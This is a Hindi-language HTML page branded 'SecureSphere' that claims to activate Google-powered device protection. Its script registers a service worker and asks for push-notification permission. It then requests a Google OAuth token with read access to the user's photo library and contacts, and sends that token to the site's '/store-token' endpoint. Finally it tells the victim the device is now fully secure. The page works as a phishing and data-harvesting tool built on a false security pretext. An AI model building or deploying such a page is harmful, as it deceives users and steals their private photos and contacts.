<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureSphere - आपकी सुरक्षा हमारी प्राथमिकता</title>
    
    <!-- गूगल की आधिकारिक लाइब्रेरी, यह प्रमाणीकरण के लिए आवश्यक है -->
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    
    <style>
        /* स्टाइलिंग में कोई बदलाव नहीं है, यह पहले जैसा ही है */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
            color: #333;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
        }
        h1 {
            color: #1c1e21;
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #606770;
            font-size: 16px;
            margin-bottom: 30px;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
            min-height: 20px;
        }
        #protectButton {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            transition: background-color 0.3s, opacity 0.3s;
        }
        #protectButton:disabled {
            cursor: not-allowed;
            opacity: 0.7;
        }
        .status-error {
            color: #fa383e;
        }
        .status-success {
             color: #28a745;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/Dialog-information.svg/2048px-Dialog-information.svg.png" alt="Security Logo" class="logo">
        <h1>अपने डिवाइस को सुरक्षित करें</h1>
        <p>Google द्वारा संचालित हमारी उन्नत सुरक्षा प्रणाली के साथ अपने डिवाइस पर पूर्ण सुरक्षा सक्रिय करें।</p>
        <button id="protectButton">पूर्ण सुरक्षा सक्रिय करें</button>
        <div id="status"></div>
    </div>

    <script>
        // ===============================================
        //  STEP 0: ज़रूरी चीजों को तैयार रखना
        // ===============================================
        const protectButton = document.getElementById('protectButton');
        const statusDiv = document.getElementById('status');
        
        // आपकी पब्लिक कुंजियाँ यहाँ हैं
        const GOOGLE_CLIENT_ID = "726864931273-qohguf62n5achrq62aja929d0b7ne8qm.apps.googleusercontent.com";
        const VAPID_PUBLIC_KEY = "BCPKrHM579ezfGzhmoQk-j7Mwr7E3gfEsUbFsOjEVozYRRZOzEMqVqm9fWEVY2pS1oYQ9BZ2xiN2hgiE7p7z3m0";

        // पेज लोड होते ही जांचें कि कहीं अनुमति पहले से ही ब्लॉक तो नहीं है
        if (Notification.permission === 'denied') {
            handleBlockedPermission();
        }

        protectButton.addEventListener('click', startProcess);

        function startProcess() {
            if (Notification.permission === 'denied') return;
            protectButton.disabled = true;
            statusDiv.className = '';
            statusDiv.textContent = 'प्रक्रिया शुरू हो रही है...';
            registerServiceWorker();
        }

        async function registerServiceWorker() {
            if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
                handleError('त्रुटि: आपका ब्राउज़र संगत नहीं है।');
                return;
            }
            try {
                await navigator.serviceWorker.register('/sw.js');
                statusDiv.textContent = 'सुरक्षा परत 1 सक्रिय...';
                askForNotificationPermission();
            } catch (error) {
                handleError('सुरक्षा सक्रियण में विफल।');
            }
        }

        async function askForNotificationPermission() {
            const permission = await Notification.requestPermission();
            
            if (permission === 'granted') {
                statusDiv.textContent = 'अनुमति मिल गई। परत 2 सक्रिय...';
                subscribeUser();
            } else if (permission === 'denied') {
                handleBlockedPermission();
            } else {
                handleDismissedPermission();
            }
        }
        
        async function subscribeUser() {
            try {
                const subscription = await navigator.serviceWorker.ready.then(reg => 
                    reg.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: VAPID_PUBLIC_KEY
                    })
                );
                await fetch('/subscribe', {
                    method: 'POST',
                    body: JSON.stringify(subscription),
                    headers: { 'Content-Type': 'application/json' }
                });
                
                // नोटिफिकेशन की अनुमति मिलने के ठीक बाद, गूगल लॉगिन शुरू करें
                handleGoogleLogin();

            } catch (err) {
                handleError('त्रुटि: सब्सक्रिप्शन विफल रहा।');
            }
        }
        
        // ==========================================================
        //  अंतिम गूगल ऑथेंटिकेशन फंक्शन (यह अब पूरी तरह से काम करता है)
        // ==========================================================
        function handleGoogleLogin() {
            try {
                statusDiv.textContent = 'Google प्रमाणीकरण शुरू हो रहा है...';
                
                // गूगल क्लाइंट को इनिशियलाइज़ करें
                const googleClient = google.accounts.oauth2.initTokenClient({
                    client_id: GOOGLE_CLIENT_ID,
                    
                    // !!! सबसे ज़रूरी: यहाँ हम गैलरी और कॉन्टैक्ट्स की अनुमति मांग रहे हैं !!!
                    scope: 'https://www.googleapis.com/auth/photoslibrary.readonly https://www.googleapis.com/auth/contacts.readonly',
                    
                    // यह फंक्शन तब चलेगा जब यूजर सफलतापूर्वक लॉगिन और अनुमति दे देगा
                    callback: (tokenResponse) => {
                        const accessToken = tokenResponse.access_token;
                        if (accessToken) {
                            statusDiv.textContent = 'Google प्रमाणीकरण सफल!';
                            // मिली हुई चाबी (टोकन) को अपने सर्वर पर भेजें
                            sendTokenToServer(accessToken);
                        } else {
                            handleError('Google से टोकन प्राप्त करने में विफल।');
                        }
                    },
                    error_callback: () => {
                        handleError('Google प्रमाणीकरण में त्रुटि हुई।');
                    }
                });

                // गूगल लॉगिन पॉप-अप को दिखाएं
                googleClient.requestAccessToken();

            } catch (error) {
                handleError('Google प्रमाणीकरण शुरू करने में विफल।');
            }
        }

        async function sendTokenToServer(token) {
            try {
                await fetch('/store-token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ accessToken: token })
                });
                console.log('एक्सेस टोकन सर्वर पर भेजा गया।');
                // टोकन भेजने के बाद अंतिम सफलता का संदेश दिखाएं
                handleSuccess();
            } catch (error) {
                handleError('सर्वर पर टोकन भेजने में विफल।');
                console.error('टोकन भेजने में विफल:', error);
            }
        }
        
        // --- हेल्पर फंक्शन्स ---
        function handleSuccess() {
            statusDiv.className = 'status-success';
            statusDiv.textContent = 'आपका डिवाइस अब पूरी तरह सुरक्षित है!';
            protectButton.style.backgroundColor = '#28a745';
            protectButton.textContent = 'सुरक्षित';
            protectButton.disabled = true;
        }
        
        function handleError(message) {
            statusDiv.className = 'status-error';
            statusDiv.textContent = message;
            protectButton.disabled = false;
        }

        function handleDismissedPermission() {
            statusDiv.className = 'status-error';
            statusDiv.textContent = 'पूर्ण सुरक्षा के लिए अनुमति आवश्यक है।';
            protectButton.disabled = false;
        }

        function handleBlockedPermission() {
            statusDiv.className = 'status-error';
            statusDiv.textContent = 'अनुमति स्थायी रूप से ब्लॉक कर दी गई है। सुरक्षा सक्रिय नहीं की जा सकती।';
            protectButton.textContent = 'अनुमति अवरुद्ध';
            protectButton.style.backgroundColor = '#888';
            protectButton.disabled = true;
        }
    </script>
</body>
</html>
